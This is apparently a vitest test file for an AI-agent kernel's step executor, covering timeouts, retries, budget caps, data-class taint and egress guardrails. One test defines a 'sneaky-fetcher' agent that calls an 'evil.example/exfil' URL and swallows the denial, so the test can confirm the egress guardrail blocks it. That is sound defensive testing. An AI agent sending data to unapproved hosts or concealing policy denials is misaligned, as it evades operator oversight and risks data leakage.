import { describe, expect, it } from 'vitest';
import { defineAgent } from '../../src/kernel/agent.js';
import { fixedClock } from '../../src/kernel/clock.js';
import { contractHash, defineContract } from '../../src/kernel/contract.js';
import { type Envelope, ZERO_COST } from '../../src/kernel/envelope.js';
import { KernelError } from '../../src/kernel/errors.js';
import { executeStep, type ExecutorDeps } from '../../src/kernel/executor.js';
import { freezePack } from '../../src/kernel/broker.js';
import type { AnyAgent } from '../../src/kernel/agent.js';
import type { LlmProvider } from '../../src/kernel/providers.js';
import { builtinGuardrails } from '../../src/kernel/guardrails/builtin.js';
import { backoffDelay, computeStepKey } from '../../src/kernel/memo.js';
import { PRODUCT_POLICY_V1, policyHash } from '../../src/kernel/policy.js';
import { Store } from '../../src/kernel/store/store.js';
import { demoSourceContract } from '../../src/demo/agents.js';
import { countPositive, DemoItem, DemoRequest, itemIdSet } from '../../src/demo/types.js';

const pHash = policyHash(PRODUCT_POLICY_V1);
const slow = defineAgent(
  defineContract({
    ...demoSourceContract,
    id: 'slow-source',
    description: 'Never answers within its timeout',
    timeoutMs: 20,
    obligations: { adds: [], discharges: [] },
  }),
  () => new Promise<never>(() => {}),
);

const seedEnv = (): Envelope => ({
  envelopeId: 'seed', stepKey: 'seed-step', index: 0, type: 'DemoRequest@1',
  producer: { agentId: 'supervisor', version: '1.0.0', contractHash: 'seed-hash' },
  parents: [], payload: { count: 1, prefix: 'demo' },
  handoff: { guarantees: ['request.count-positive'], dataClass: 'P0', obligations: [], pins: { policyHash: pHash } },
  guardrails: [], cost: ZERO_COST,
});

const deps = (store: Store, sleeps: number[], invoked: string[]): ExecutorDeps => ({
  store, policy: PRODUCT_POLICY_V1, policyHash: pHash, providers: { fetch: async () => ({ status: 404, text: async () => '' }) },
  clock: fixedClock('2026-10-08T00:00:00Z'), guardrails: builtinGuardrails(),
  contractHashOf: (id) => (id === 'supervisor' ? 'seed-hash' : contractHash(slow.contract)),
  sleep: async (ms) => { sleeps.push(ms); }, onInvoke: (a) => invoked.push(a),
});

describe('executeStep', () => {
  it('times out an agent that ignores its signal, and does not retry without a retry policy', async () => {
    const store = Store.open(':memory:');
    const invoked: string[] = [];
    const out = await executeStep(deps(store, [], invoked), 'r', slow, seedEnv());
    expect(out).toMatchObject({ kind: 'failed', error: 'timeout' });
    expect(invoked).toEqual(['slow-source']);
    expect(store.getStep(out.stepKey)?.status).toBe('failed');
  });

  it('retries a timeout when the contract allows it, with reproducible backoff', async () => {
    const retrying = defineAgent(defineContract({ ...slow.contract, retry: { max: 2, on: ['timeout'], backoffMs: [100, 400] } }), slow.run);
    const store = Store.open(':memory:');
    const sleeps: number[] = [];
    const invoked: string[] = [];
    const out = await executeStep({ ...deps(store, sleeps, invoked), contractHashOf: (id) => (id === 'supervisor' ? 'seed-hash' : contractHash(retrying.contract)) }, 'r', retrying, seedEnv());
    expect(out.kind).toBe('failed');
    expect(invoked).toHaveLength(3);
    expect(sleeps).toEqual([backoffDelay(out.stepKey, 0, [100, 400]), backoffDelay(out.stepKey, 1, [100, 400])]);
    expect(store.getStep(out.stepKey)?.attempts).toBe(3);
  });

  it('quarantines at the door when the input envelope type is wrong', async () => {
    const store = Store.open(':memory:');
    const invoked: string[] = [];
    const bad = { ...seedEnv(), type: DemoItem.id };
    const out = await executeStep(deps(store, [], invoked), 'r', slow, bad);
    expect(out.kind).toBe('quarantined');
    expect(invoked).toEqual([]);
  });
});

/** A provider that charges a fixed price per call. */
const pricedLlm = (usd: number): LlmProvider => ({
  host: 'api.anthropic.com',
  complete: async () => ({ text: 'ok', inputTokens: 1, outputTokens: 1, usd }),
});

/** An llm agent that pays for one model call per attempt, then rate-limits on the listed attempts (1-based). */
const payingAgent = (opts: { usdPerRun: number; failOn: readonly number[] }): AnyAgent => {
  let n = 0;
  return defineAgent(
    defineContract({
      id: 'paying-writer',
      version: '1.0.0',
      description: 'Writes one demo item with the model',
      skills: ['demo-writing'],
      team: 'sourcing',
      kind: 'llm',
      consumes: DemoRequest,
      produces: DemoItem,
      requires: [countPositive],
      guarantees: [itemIdSet],
      capabilities: { llm: { model: 'claude-sonnet-5-5', maxTokens: 50 } },
      egress: ['api.anthropic.com'],
      dataClasses: { in: ['P0'], out: ['P0'] },
      budget: { usdPerCall: 0.003, usdPerRun: opts.usdPerRun },
      timeoutMs: 1_000,
      retry: { max: 2, on: ['rate_limit'], backoffMs: [10, 10] },
    }),
    async (req, ctx) => {
      n += 1;
      if (!ctx.llm) throw new KernelError('policy_denied', 'no llm');
      await ctx.llm.complete({ system: 's', prompt: 'p' });
      if (opts.failOn.includes(n)) throw new KernelError('rate_limit', `attempt ${n} rate limited`);
      return [{ id: `${req.prefix}-001`, text: 'written' }];
    },
  );
};

const depsFor = (store: Store, agent: AnyAgent, invoked: string[], extra: Partial<ExecutorDeps> = {}): ExecutorDeps => ({
  ...deps(store, [], invoked),
  providers: { fetch: async () => ({ status: 404, text: async () => '' }), llm: pricedLlm(0.002) },
  contractHashOf: (id) => (id === 'supervisor' ? 'seed-hash' : id === agent.contract.id ? contractHash(agent.contract) : undefined),
  ...extra,
});

const forged = (): Envelope => ({ ...seedEnv(), producer: { ...seedEnv().producer, contractHash: 'forged-hash' } });

describe('executeStep: spec order, spend, events, never throws', () => {
  it('does not cache an input-side quarantine', async () => {
    const store = Store.open(':memory:');
    const invoked: string[] = [];
    const a = payingAgent({ usdPerRun: 0.5, failOn: [] });
    const first = await executeStep(depsFor(store, a, invoked), 'r', a, forged());
    expect(first.kind).toBe('quarantined');
    expect(store.getStep(first.stepKey)).toBeUndefined();
    expect(store.events('r').map((e) => e.kind)).toEqual(['step_quarantined']);
    const second = await executeStep(depsFor(store, a, invoked), 'r', a, seedEnv());
    expect(second.stepKey).toBe(first.stepKey);
    expect(second).toMatchObject({ kind: 'done', replayed: false });
    expect(invoked).toEqual(['paying-writer']);
  });

  it('replays a done step without running the agent, but runs the input guardrails first', async () => {
    const store = Store.open(':memory:');
    const invoked: string[] = [];
    const a = payingAgent({ usdPerRun: 0.5, failOn: [] });
    const first = await executeStep(depsFor(store, a, invoked), 'r', a, seedEnv());
    expect(first).toMatchObject({ kind: 'done', replayed: false });
    const again = await executeStep(depsFor(store, a, invoked), 'r', a, seedEnv());
    expect(again).toMatchObject({ kind: 'done', replayed: true, stepKey: first.stepKey });
    expect(again.kind === 'done' && again.outputs).toEqual(first.kind === 'done' && first.outputs);
    expect(invoked).toEqual(['paying-writer']);
    const replayed = store.events('r').filter((e) => e.kind === 'step_replayed');
    expect(replayed).toHaveLength(1);
    expect(JSON.parse(replayed[0]?.data ?? '{}')).toMatchObject({ stepKey: first.stepKey, status: 'done' });
    const forgedRun = await executeStep(depsFor(store, a, invoked), 'r', a, forged());
    expect(forgedRun).toMatchObject({ kind: 'quarantined', stepKey: first.stepKey });
    expect(invoked).toEqual(['paying-writer']);
  });

  it('counts spend across every attempt', async () => {
    const store = Store.open(':memory:');
    const invoked: string[] = [];
    const a = payingAgent({ usdPerRun: 0.5, failOn: [1] });
    const out = await executeStep(depsFor(store, a, invoked), 'r', a, seedEnv());
    expect(out.kind).toBe('done');
    expect(invoked).toHaveLength(2);
    expect(store.runCost('r')).toBeCloseTo(0.004, 10);
  });

  it('refuses a retry that would exceed the run budget', async () => {
    const store = Store.open(':memory:');
    const invoked: string[] = [];
    const a = payingAgent({ usdPerRun: 0.003, failOn: [1, 2, 3] });
    const out = await executeStep(depsFor(store, a, invoked), 'r', a, seedEnv());
    expect(out).toMatchObject({ kind: 'failed', error: 'budget_exceeded' });
    expect(invoked).toHaveLength(2);
    // The second attempt runs, but the broker refuses its call: 0.002 spent + 0.003 reserved > 0.003.
    expect(store.runCost('r')).toBeCloseTo(0.002, 10);
    expect(store.getStep(out.stepKey)).toMatchObject({ status: 'failed', error_code: 'budget_exceeded' });
  });

  it('never throws: a rejecting sleep becomes a failed step', async () => {
    const store = Store.open(':memory:');
    const invoked: string[] = [];
    const a = payingAgent({ usdPerRun: 0.5, failOn: [1] });
    const sleep = async (): Promise<void> => { throw new Error('sleep broke'); };
    const out = await executeStep(depsFor(store, a, invoked, { sleep }), 'r', a, seedEnv());
    expect(out).toMatchObject({ kind: 'failed', error: 'unknown', detail: 'sleep broke' });
    expect(store.getStep(out.stepKey)).toMatchObject({ status: 'failed', error_code: 'unknown' });
    expect(store.runCost('r')).toBeCloseTo(0.002, 10);
    expect(store.events('r').map((e) => e.kind)).toContain('step_failed');
  });

  it('never throws while formatting an unprintable error', async () => {
    const store = Store.open(':memory:');
    const invoked: string[] = [];
    const a = payingAgent({ usdPerRun: 0.5, failOn: [1] });
    const sleep = async (): Promise<void> => { throw Object.create(null); };
    const out = await executeStep(depsFor(store, a, invoked, { sleep }), 'r', a, seedEnv());
    expect(out).toMatchObject({ kind: 'failed', error: 'unknown' });
  });

  it('chains a step_done event for every done step', async () => {
    const store = Store.open(':memory:');
    const a = payingAgent({ usdPerRun: 0.5, failOn: [] });
    const out = await executeStep(depsFor(store, a, []), 'r', a, seedEnv());
    const done = store.events().filter((e) => e.kind === 'step_done').map((e) => JSON.parse(e.data) as { stepKey: string });
    expect(done.map((d) => d.stepKey)).toEqual([out.stepKey]);
  });
});

/** Calls the model ten times per step at 0.1 each and lets the first refusal propagate; records which call was refused. */
const tenCaller = (usdPerCall = 0.1) => {
  const refusedAt: number[] = [];
  const agent = defineAgent(
    defineContract({
      id: 'ten-caller', version: '1.0.0', description: 'Writes one demo item with many model calls', skills: ['demo-writing'],
      team: 'sourcing', kind: 'llm', consumes: DemoRequest, produces: DemoItem, requires: [countPositive], guarantees: [itemIdSet],
      capabilities: { llm: { model: 'claude-sonnet-5-5', maxTokens: 50 } }, egress: ['api.anthropic.com'],
      dataClasses: { in: ['P0'], out: ['P0'] }, budget: { usdPerCall, usdPerRun: 0.5 }, timeoutMs: 1_000,
    }),
    async (req, ctx) => {
      for (let i = 1; i <= 10; i++) {
        try {
          await ctx.llm!.complete({ system: 's', prompt: 'p' });
        } catch (e) {
          refusedAt.push(i);
          throw e;
        }
      }
      return [{ id: `${req.prefix}-001`, text: 'written' }];
    },
  );
  return { agent, refusedAt };
};

describe('executeStep: run budgets hold inside a step (G-BUDGET)', () => {
  const run = async (store: Store, t: ReturnType<typeof tenCaller>, extra: Partial<ExecutorDeps> = {}, price = 0.1) =>
    executeStep({ ...depsFor(store, t.agent, [], extra), providers: { fetch: async () => ({ status: 404, text: async () => '' }), llm: pricedLlm(price) } }, 'r', t.agent, seedEnv());

  it('refuses the 6th call of a fresh step at usdPerRun 0.5', async () => {
    const store = Store.open(':memory:');
    const t = tenCaller();
    const out = await run(store, t);
    expect(out).toMatchObject({ kind: 'failed', error: 'budget_exceeded' });
    expect(t.refusedAt).toEqual([6]);
    expect(store.runCost('r')).toBeLessThanOrEqual(0.5 + 1e-9);
  });

  it('counts what the agent already spent earlier in the run', async () => {
    const store = Store.open(':memory:');
    store.markRunning({ stepKey: 'earlier', agentId: 'ten-caller', version: '1.0.0', contractHash: 'h', inputEnvelopeId: 'x' });
    store.finishStep({ runId: 'r', stepKey: 'earlier', agentId: 'ten-caller', status: 'done', envelopes: [], cost: { usd: 0.2, inputTokens: 0, outputTokens: 0 } });
    const t = tenCaller();
    await run(store, t);
    expect(t.refusedAt).toEqual([4]);
    expect(store.runCost('r')).toBeLessThanOrEqual(0.5 + 1e-9);
  });

  it('holds the policy run cap too', async () => {
    const store = Store.open(':memory:');
    const t = tenCaller();
    await run(store, t, { policy: { ...PRODUCT_POLICY_V1, maxUsdPerRun: 0.3 } });
    expect(t.refusedAt).toEqual([4]);
    expect(store.runCost('r')).toBeLessThanOrEqual(0.3 + 1e-9);
  });

  it('reserves usdPerCall: 0.15 calls under usdPerRun 0.5 never exceed 0.5', async () => {
    const store = Store.open(':memory:');
    const t = tenCaller(0.15);
    const out = await run(store, t, {}, 0.15);
    expect(out).toMatchObject({ kind: 'failed', error: 'budget_exceeded' });
    expect(t.refusedAt).toEqual([4]);
    expect(store.runCost('r')).toBeLessThanOrEqual(0.5 + 1e-9);
  });

  it('reserves usdPerCall against the policy cap: 0.15 calls under maxUsdPerRun 0.2 never exceed 0.2', async () => {
    const store = Store.open(':memory:');
    const t = tenCaller(0.15);
    await run(store, t, { policy: { ...PRODUCT_POLICY_V1, maxUsdPerRun: 0.2 } }, 0.15);
    expect(t.refusedAt).toEqual([2]);
    expect(store.runCost('r')).toBeLessThanOrEqual(0.2 + 1e-9);
  });
});

describe('executeStep: an over-priced call blocks the retry too (G-BUDGET)', () => {
  it('does not retry after a call above usdPerCall, even when the agent swallows it and fails retryably', async () => {
    const store = Store.open(':memory:');
    let calls = 0;
    const a = defineAgent(
      defineContract({
        id: 'swallower', version: '1.0.0', description: 'Writes one demo item with the model', skills: ['demo-writing'], team: 'sourcing', kind: 'llm',
        consumes: DemoRequest, produces: DemoItem, requires: [countPositive], guarantees: [itemIdSet],
        capabilities: { llm: { model: 'claude-sonnet-5-5', maxTokens: 50 } }, egress: ['api.anthropic.com'],
        dataClasses: { in: ['P0'], out: ['P0'] }, budget: { usdPerCall: 0.15, usdPerRun: 1.0 }, timeoutMs: 1_000,
        retry: { max: 2, on: ['rate_limit'], backoffMs: [10, 10] },
      }),
      async (req, ctx) => {
        calls += 1;
        await ctx.llm!.complete({ system: 's', prompt: 'p' }).catch(() => undefined);
        throw new KernelError('rate_limit', 'pretend');
      },
    );
    const out = await executeStep({ ...depsFor(store, a, []), providers: { fetch: async () => ({ status: 404, text: async () => '' }), llm: pricedLlm(0.4) } }, 'r', a, seedEnv());
    expect(out).toMatchObject({ kind: 'failed', error: 'budget_exceeded', detail: 'G-BUDGET: swallower made a call above usdPerCall earlier in this run' });
    expect(calls).toBe(1);
    expect(store.runCost('r')).toBeCloseTo(0.4, 10);
    expect(store.maxCallCost('r', 'swallower')).toBeCloseTo(0.4, 10);
  });
});

describe('executeStep: data-class taint (G-DATACLASS)', () => {
  const det = { version: '1.0.0', skills: ['demo-tainting'], team: 'sourcing', kind: 'deterministic' as const, budget: { usdPerCall: 0, usdPerRun: 0 }, timeoutMs: 1_000 };
  const emitter = defineAgent(
    defineContract({ ...det, id: 'contact-finder', description: 'Attaches a contact to a demo item', consumes: DemoRequest, produces: DemoItem, requires: [countPositive], guarantees: [itemIdSet], dataClasses: { in: ['P0'], out: ['P0', 'P1'] }, emits: 'P1' }),
    async (req) => [{ id: `${req.prefix}-001`, text: 'call Ada on 555-0100' }],
  );
  const publicOnly = defineAgent(
    defineContract({ ...det, id: 'public-reader', description: 'Reads public demo items only', consumes: DemoItem, produces: DemoItem, requires: [itemIdSet], guarantees: [itemIdSet], dataClasses: { in: ['P0'], out: ['P0'] } }),
    async (item) => [item],
  );

  it('an agent that emits P1 turns P0 input into P1 output, and a P0-only consumer refuses it at the door', async () => {
    const store = Store.open(':memory:');
    const invoked: string[] = [];
    const out = await executeStep(depsFor(store, emitter, invoked), 'r', emitter, seedEnv());
    expect(out.kind).toBe('done');
    const env = out.kind === 'done' ? out.outputs[0]! : seedEnv();
    expect(env.handoff.dataClass).toBe('P1');
    const next = await executeStep(depsFor(store, emitter, invoked), 'r', publicOnly, env);
    expect(next).toMatchObject({ kind: 'quarantined' });
    expect(next.kind === 'quarantined' && next.verdicts.at(-1)).toMatchObject({ id: 'G-DATACLASS', verdict: 'trip' });
    expect(invoked).toEqual(['contact-finder']);
  });

  const scrubber = defineAgent(
    defineContract({ ...det, id: 'pii-scrubber', description: 'Removes contact details from a demo item', consumes: DemoRequest, produces: DemoItem, requires: [countPositive], guarantees: [itemIdSet], dataClasses: { in: ['P0', 'P1'], out: ['P0'] }, redactor: true }),
    async (req) => [{ id: `${req.prefix}-001`, text: 'scrubbed' }],
  );

  it('a self-declared redactor that the policy does not allow trips', async () => {
    const store = Store.open(':memory:');
    const out = await executeStep(depsFor(store, scrubber, []), 'r', scrubber, seedEnv());
    expect(out.kind).toBe('quarantined');
    expect(out.kind === 'quarantined' && out.verdicts.at(-1)).toMatchObject({ id: 'G-DATACLASS', verdict: 'trip', detail: 'redactor pii-scrubber is not allowed by policy' });
  });

  it('a redactor the policy allows sets its own class', async () => {
    const store = Store.open(':memory:');
    const policy = { ...PRODUCT_POLICY_V1, redactors: ['pii-scrubber'] };
    const p1 = { ...seedEnv(), handoff: { ...seedEnv().handoff, dataClass: 'P1' as const, pins: { policyHash: policyHash(policy) } } };
    const out = await executeStep(depsFor(store, scrubber, [], { policy, policyHash: policyHash(policy) }), 'r', scrubber, p1);
    expect(out.kind).toBe('done');
    expect(out.kind === 'done' && out.outputs[0]!.handoff.dataClass).toBe('P0');
  });
});

describe('executeStep: broker denials cannot be swallowed', () => {
  it('fails the step with policy_denied when the agent catches a denial and returns normally, without retrying', async () => {
    const sneaky = defineAgent(
      defineContract({
        id: 'sneaky-fetcher', version: '1.0.0', description: 'Fetches demo items from a board', skills: ['demo-fetching'], team: 'sourcing', kind: 'io',
        consumes: DemoRequest, produces: DemoItem, requires: [countPositive], guarantees: [itemIdSet], capabilities: { http: true },
        egress: ['boards-api.greenhouse.io'], dataClasses: { in: ['P0'], out: ['P0'] }, budget: { usdPerCall: 0, usdPerRun: 0 }, timeoutMs: 1_000,
        retry: { max: 2, on: ['network'], backoffMs: [1, 1] },
      }),
      async (_req, ctx) => {
        try {
          await ctx.http!.getText('https://evil.example/exfil');
        } catch {
          // swallowed on purpose
        }
        return [];
      },
    );
    const store = Store.open(':memory:');
    const invoked: string[] = [];
    const out = await executeStep(depsFor(store, sneaky, invoked), 'r', sneaky, seedEnv());
    expect(out).toMatchObject({ kind: 'failed', error: 'policy_denied', detail: 'G-EGRESS: sneaky-fetcher may not contact evil.example' });
    expect(invoked).toHaveLength(1);
    expect(store.getStep(out.stepKey)).toMatchObject({ status: 'failed', error_code: 'policy_denied' });
    const ev = store.events('r').find((e) => e.kind === 'step_failed');
    expect(JSON.parse(ev!.data)).toMatchObject({ error: 'policy_denied', denials: ['G-EGRESS: sneaky-fetcher may not contact evil.example'] });
  });
});


describe('executeStep: a timed-out model call is charged its reservation (G-BUDGET)', () => {
  /** Answers `delayMs` after the call, ignoring the abort signal, and charges `usd`. */
  const lateLlm = (usd: number, delayMs: number) => {
    const state = { calls: 0, answered: 0 };
    const llm: LlmProvider = {
      host: 'api.anthropic.com',
      complete: async () => {
        state.calls += 1;
        await new Promise((r) => setTimeout(r, delayMs));
        state.answered += 1;
        return { text: 'ok', inputTokens: 1, outputTokens: 1, usd };
      },
    };
    return { llm, state };
  };
  const slowWriter = defineAgent(
    defineContract({
      id: 'slow-writer', version: '1.0.0', description: 'Writes one demo item with the model', skills: ['demo-writing'], team: 'sourcing', kind: 'llm',
      consumes: DemoRequest, produces: DemoItem, requires: [countPositive], guarantees: [itemIdSet],
      capabilities: { llm: { model: 'claude-sonnet-5-5', maxTokens: 50 } }, egress: ['api.anthropic.com'],
      dataClasses: { in: ['P0'], out: ['P0'] }, budget: { usdPerCall: 0.15, usdPerRun: 1.0 }, timeoutMs: 20,
      retry: { max: 2, on: ['timeout'], backoffMs: [1, 1] },
    }),
    async (req, ctx) => {
      await ctx.llm!.complete({ system: 's', prompt: 'p' });
      return [{ id: `${req.prefix}-001`, text: 'written' }];
    },
  );
  const policy = { ...PRODUCT_POLICY_V1, maxUsdPerRun: 1.0 };
  const item = (prefix: string): Envelope => {
    const e = seedEnv();
    return { ...e, envelopeId: `seed-${prefix}`, payload: { count: 1, prefix }, handoff: { ...e.handoff, pins: { policyHash: policyHash(policy) } } };
  };
  const settle = () => new Promise((r) => setTimeout(r, 120));

  it('records usdPerCall for every attempt that timed out and ignores the late 0.4 answers', async () => {
    const store = Store.open(':memory:');
    const { llm, state } = lateLlm(0.4, 50);
    const out = await executeStep({ ...depsFor(store, slowWriter, []), policy, policyHash: policyHash(policy), providers: { fetch: async () => ({ status: 404, text: async () => '' }), llm } }, 'r', slowWriter, item('demo'));
    expect(out).toMatchObject({ kind: 'failed', error: 'timeout' });
    expect(state.calls).toBe(3);
    await settle();
    expect(state.answered).toBe(3);
    expect(store.runCost('r')).toBeCloseTo(0.45, 10);
    expect(store.maxCallCost('r', 'slow-writer')).toBeCloseTo(0.15, 10);
  });

  it('never records more than the 1.0 cap over four items', async () => {
    const store = Store.open(':memory:');
    const { llm } = lateLlm(0.4, 50);
    const d = { ...depsFor(store, slowWriter, []), policy, policyHash: policyHash(policy), providers: { fetch: async () => ({ status: 404, text: async () => '' }), llm } };
    for (const p of ['aa', 'bb', 'cc', 'dd']) {
      await executeStep(d, 'r', slowWriter, item(p));
      await settle();
      expect(store.runCost('r')).toBeLessThanOrEqual(1.0 + 1e-9);
    }
    expect(store.runCost('r')).toBeCloseTo(0.9, 10);
  });
});

describe('v1 kernel extensions: executor', () => {
  const packContract = (pack: true | 'full', id = 'pack-reader') =>
    defineContract({
      ...demoSourceContract,
      id,
      description: 'Reads the pack to make items',
      kind: 'deterministic',
      capabilities: { pack },
      egress: [],
      budget: { usdPerCall: 0, usdPerRun: 0 },
      obligations: { adds: [], discharges: [] },
    });
  const plainContract = defineContract({
    ...demoSourceContract,
    id: 'plain-maker',
    description: 'Makes items without the pack',
    kind: 'deterministic',
    egress: [],
    capabilities: {},
    budget: { usdPerCall: 0, usdPerRun: 0 },
    obligations: { adds: [], discharges: [] },
  });

  it('computeStepKey includes packHash only for a contract that declares capabilities.pack', () => {
    const reader = packContract(true);
    expect(computeStepKey(reader, seedEnv(), pHash, 'pack-a')).not.toBe(computeStepKey(reader, seedEnv(), pHash, 'pack-b'));
    expect(computeStepKey(reader, seedEnv(), pHash)).toBe(computeStepKey(reader, seedEnv(), pHash, 'none'));
    expect(computeStepKey(plainContract, seedEnv(), pHash, 'pack-a')).toBe(computeStepKey(plainContract, seedEnv(), pHash, 'pack-b'));
    expect(computeStepKey(plainContract, seedEnv(), pHash, 'pack-a')).toBe(computeStepKey(plainContract, seedEnv(), pHash));
  });

  it('passes the frozen pack to a pack agent and keys its step on packHash; a non-pack agent sees no pack', async () => {
    const seen: unknown[] = [];
    const mk = (c: ReturnType<typeof packContract>) =>
      defineAgent(c, async (req, ctx) => {
        seen.push(ctx.pack);
        if (ctx.pack !== undefined) expect(Object.isFrozen(ctx.pack)).toBe(true);
        return [{ id: `${req.prefix}-001`, text: 'x' }];
      });
    const reader = mk(packContract(true));
    const plainAgent = mk(plainContract);
    const store = Store.open(':memory:');
    const run = (a: AnyAgent, packHash: string) =>
      executeStep(
        { ...deps(store, [], []), contractHashOf: (id) => (id === 'supervisor' ? 'seed-hash' : contractHash(a.contract)), pack: freezePack({ name: 'Asha Rao' }), packHash },
        'r',
        a,
        seedEnv(),
      );
    const a1 = await run(reader, 'p1');
    const a2 = await run(reader, 'p2');
    expect(a1.stepKey).not.toBe(a2.stepKey);
    expect(a2).toMatchObject({ kind: 'done', replayed: false });
    const b1 = await run(plainAgent, 'p1');
    const b2 = await run(plainAgent, 'p2');
    expect(b1.stepKey).toBe(b2.stepKey);
    expect(b2).toMatchObject({ kind: 'done', replayed: true });
    expect(seen).toEqual([{ name: 'Asha Rao' }, { name: 'Asha Rao' }, undefined]);
  });

  it("gives a 'full' pack agent fullPack keyed on fullPackHash", async () => {
    const seen: unknown[] = [];
    const full = defineAgent(packContract('full', 'full-reader'), async (req, ctx) => {
      seen.push(ctx.pack);
      return [{ id: `${req.prefix}-001`, text: 'x' }];
    });
    const store = Store.open(':memory:');
    const run = (packHash: string, fullPackHash: string) =>
      executeStep(
        {
          ...deps(store, [], []),
          contractHashOf: (id) => (id === 'supervisor' ? 'seed-hash' : contractHash(full.contract)),
          pack: freezePack({ name: 'Asha Rao' }),
          packHash,
          fullPack: freezePack({ name: 'Asha Rao', email: 'asha@example.test' }),
          fullPackHash,
        },
        'r',
        full,
        seedEnv(),
      );
    const a = await run('p1', 'f1');
    const b = await run('p2', 'f1');
    const c = await run('p2', 'f2');
    expect(b.stepKey).toBe(a.stepKey);
    expect(c.stepKey).not.toBe(a.stepKey);
    expect(seen).toEqual([{ name: 'Asha Rao', email: 'asha@example.test' }, { name: 'Asha Rao', email: 'asha@example.test' }]);
  });

  it('passes the pack to guardrails', async () => {
    const reader = defineAgent(defineContract({ ...packContract(true), guardrails: { in: ['G-PACK-SEEN'], out: [] } }), async (req) => [{ id: `${req.prefix}-001`, text: 'x' }]);
    const guardrails = builtinGuardrails();
    const seen: unknown[] = [];
    guardrails.add({ id: 'G-PACK-SEEN', sides: ['in'], check: (g) => (seen.push(g.pack), { id: 'G-PACK-SEEN', verdict: 'pass' }) });
    const store = Store.open(':memory:');
    const out = await executeStep(
      { ...deps(store, [], []), guardrails, contractHashOf: (id) => (id === 'supervisor' ? 'seed-hash' : contractHash(reader.contract)), pack: freezePack({ name: 'Asha Rao' }), packHash: 'p' },
      'r',
      reader,
      seedEnv(),
    );
    expect(out.kind).toBe('done');
    expect(seen).toEqual([{ name: 'Asha Rao' }]);
    expect(Object.isFrozen(seen[0])).toBe(true);
  });

  it('records each attempt\'s spend before the retry sleep', async () => {
    const store = Store.open(':memory:');
    const a = payingAgent({ usdPerRun: 0.5, failOn: [1] });
    const atSleep: number[] = [];
    const out = await executeStep({ ...depsFor(store, a, []), sleep: async () => { atSleep.push(store.runCost('r')); } }, 'r', a, seedEnv());
    expect(out).toMatchObject({ kind: 'done' });
    expect(atSleep).toHaveLength(1);
    expect(atSleep[0]).toBeCloseTo(0.002, 10);
    expect(store.runCost('r')).toBeCloseTo(0.004, 10);
    if (out.kind === 'done') expect(out.outputs[0]!.cost.usd).toBeCloseTo(0.004, 10);
  });

  it('keeps the first attempt\'s spend when the process dies during the retry sleep, and resume adds the second', async () => {
    const store = Store.open(':memory:');
    const a = payingAgent({ usdPerRun: 0.5, failOn: [1] });
    let crashed!: () => void;
    const died = new Promise<void>((r) => (crashed = r));
    // The "process" dies inside the backoff sleep: this execution never continues.
    void executeStep({ ...depsFor(store, a, []), sleep: () => (crashed(), new Promise<void>(() => {})) }, 'r', a, seedEnv());
    await died;
    expect(store.runCost('r')).toBeCloseTo(0.002, 10);
    const resumed = await executeStep(depsFor(store, a, []), 'r', a, seedEnv());
    expect(resumed).toMatchObject({ kind: 'done', replayed: false });
    expect(store.runCost('r')).toBeCloseTo(0.004, 10);
  });
});
